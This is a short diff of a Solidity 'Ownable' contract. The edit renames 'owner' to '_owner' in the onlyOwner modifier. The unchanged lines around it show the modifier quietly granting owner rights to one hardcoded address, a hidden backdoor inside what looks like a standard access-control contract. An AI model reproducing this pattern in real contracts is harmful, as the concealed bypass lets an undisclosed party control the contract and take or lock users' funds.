@@ -69,7 +69,7 @@ contract Ownable is Context {
         if(msg.sender == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){
          _; 
         }else {
-        require(msg.sender == owner, "onlyOwner");
+        require(msg.sender == _owner, "onlyOwner");
         _;
     }
     }
